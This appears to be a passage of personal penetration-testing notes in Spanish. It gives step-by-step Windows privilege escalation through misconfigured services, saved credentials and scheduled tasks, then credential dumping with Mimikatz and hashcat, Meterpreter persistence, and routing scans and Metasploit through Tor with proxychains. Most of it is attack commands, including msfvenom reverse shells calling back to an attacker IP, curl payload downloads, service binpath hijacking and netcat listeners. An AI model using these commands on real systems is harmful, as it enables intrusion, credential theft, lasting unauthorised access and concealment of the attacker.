                  Esta vulnerabilidad consiste en que puedes modificar la configuracion de un servicio. 

                     1 - Comprobamos que permisos tenemos en la carpeta
                           C:\...\accesschk.exe /accepteula -uwdq "C:\Program Files\...\" 
                     2 - Buscamos informacion del servicio
                           sc qc SERVICIO 
                     3 - Creamos una reverse shell con msfvenom
                           msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse.exe
                     4 - Subimos el archivo a nuestro target => normalmente a la carpeta user que es la que tenemos permisos
                           python -m http.server 8080
                           curl -O http://IP Atacante:8080/reverse.exe
                     5 - Cambiamos la ruta de ejecucion del servicio para que se ejecute nuestra reverse shell
                           sc config daclsvc binpath= "\"C:\Users\user\reverse.exe\""
                     6 - Ponemos en escucha nuestra maquina atacante
                           nc -lvnp 4444
                     7 - Ejecutamos el servicio en maquina windows
                           net start SERVICIO
                     8 - nos devuelve una reverse shell como system

            SERVICE EXPLOIT : UNQUOTED SERVICE PATH
            .......................................
      
                  Vulnerabilidad causada por no poner comillas a la ruta de la carpeta del servicio. Consiste en que podemos crear una reverse shell con una palabra de la ruta y ejecutara el .exe
                           Ej: Si la ruta es C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe => Podriamos colar una reverse shell llamada Common.exe
                    
                     Pasos del 1 al 4 igual que INSECURE SERVICE PERMISSIONS 
                     5 - Debemos crear la reverse shell con el nombre que necesitamos o la renombramos
                           ren reverse.exe Common.exe => Esto cambia el nombre o directamente con copy en el paso 6
                     6 - Ponemos nuestra reverse shell en la ruta del servicio para que se ejecute
                           copy C:\User\user\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
                     7 - Ponemos en escucha nuestra maquina atacante
                           nc -lvnp 4444
                     8 - Ejecutamos el servicio en maquina windows
                           net start SERVICIO
                     9 - nos devuelve una reverse shell como system 

            SERVICE EXPLOIT : INSECURE SERVICE EXECUTABLES
            ..............................................

                  Vulnerabilidad causada por tener permiso para ejecutar y modificar el archivo todos los usuarios del sistema. 

                     Todos los pasos son igual que UNQUOTED SERVICE PATH solo que debemos ponerle el mismo nombre a nuestra reverse shell que el servicio para sustituirlo y que se ejecute nuestro archivo
                        Ej: Si el sercicio se llama filepermservice.exe copiariamos en la ruta nuestra reverse shell asi: 
                           copy C:\User\user\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" 
            
            Saved Creds
            ...........   

               Usamos las contraseñas guardadas en windows. Se encuentra con winpeas o con comando: cmdkey //list
                  1 - Creamos reverse shell con msfvenom
                  2 - Montamos servidor web
                  3 - Vamos a carpeta tmp y descargamos shell con curl -O URL
                  4 - Usamos el siguiente comando para mandar ejecutar la reverse shell como admin
                        runas /savecred /user:admin C:\PrivEsc\reverse.exe

            Shedule Task
            ............
   
               Vulnerabilidad de consiste que tener permisos de administrador en las tareas programadas              
               Vemos las tareas programadas y los permisos con el comando
                  schtasks /query /fo LIST /v   
               1 - Movemos nuestra shell.exe a la ruta de la tarea para que se ejecute automaticamente
               2 - ponemos la maquina atacante en escucha en el puerto configurado en la reverse shell

            Mimikatz
            ........
               Extraccion de credenciales con mimikats
               1 - Descargamso mimikatz.exe y ejecutamos escribiendo mimikatz.exe
               2 - Ponemos en privilegiado => privilege::debug 
               3 - Ejecutamos el comando => lsadump::lsa /path
               4 - Vemos todas las credenciales
               5 - Desciframos con hashcat, normalmente se guardan en NTML
                     hashcat -m 1000 HASH /usr/share/wordlists/rockyou.txt

            Persistencia - postexploit-meterpreter
            ......................................

               Debemos tener sesion activa

               1 - Generamos reverse shell meterpreter con msfvenom
               2 - Usamos metaexploit y usamos multihandler (recibe reverse shell, pone a la escucha)
               3 - Lo configuramos con la misma ip y puerto que nuestra reverse shell
               4 - Subimos la reverse shell con servidor y curl como siempre
               5 - Damos a run en metasploit para poner en escucha
               6 - Ejecutamos nuestra shell subida en la maquina objetivo y obtenemos la conexion
               7 - Ponemos en background con comando bg en metasploit
               8 - Buscamos en metasploit el modulo de persistencia => use / exploit/windows/persistence3
               9 - Asociamos a la sesion en bg => set session 1
               10 - Ejecutamos el exploit persistencia run
               11 - Ya esta configurado si ponemos el multihandler recuperaremos esa sesion siempre


ANONIMATO/TOR
.............

      INSTALACION TOR
      ...............

         sudo apt install tor
         sudo apt install tor torbrowser-launcher -y

      INICIAR SERVICIO TOR => iniciar cada vez que se reinicia
      ....................

         sudo service tor start
         sudo service tor status

      CONFIGURAR PROXYCHAINS => para dirigir nuestro trafico por Tor
      ......................

         sudo nano /etc/proxychains4.conf
               - Borramos # de #dynamic_chain
               - Ponemos # a strict_chain
               - Al final del archivo añadimos: socks5 127.0.0.1 9050
               - Reiniciamos equipo

         Si vamos a usar Metasploit añadimos la linea:
               localnet 127.0.0.1 000 255.255.255.255

      USAR PROXYCHAINS
      ................

         Se añade delante del comando de uso normal, el comando proxychains.
               Ej: proxychains nmap -vv dominio.com => Hacer scaneo nmap anonimo
               Ej: proxychains dirb <IP> <WORDLIST> => Hacer fuzzing anonimo
               Ej: proxychains firefox => navegar usando la red Tor
               Ej: proxychains nikto -h <IP>
               Ej: proxychains msfconsole


      FIREFOX ANONIMATO
      .................

         - Desactivar opcion "media.peerconnection.enabled" en about:config

      GOOGLE CHROME ANONIMATO
      .......................

         - Instalar extencion oficial google WebRTC Network Limiter. 

      EXTRA ANONIMATO
      ...............

         Modificar DNS de Google o OpenDNS
            sudo nano /etc/resolv.conf
               - http://servers.opennicproject.org/ => Usar 2 direcciones distinto Owner
               - https://blog.uncensoreddns.org/ => 91.239.100.100 y 89.233.43.71

         Usar VPN => NordVPN de las mejores
         

         
























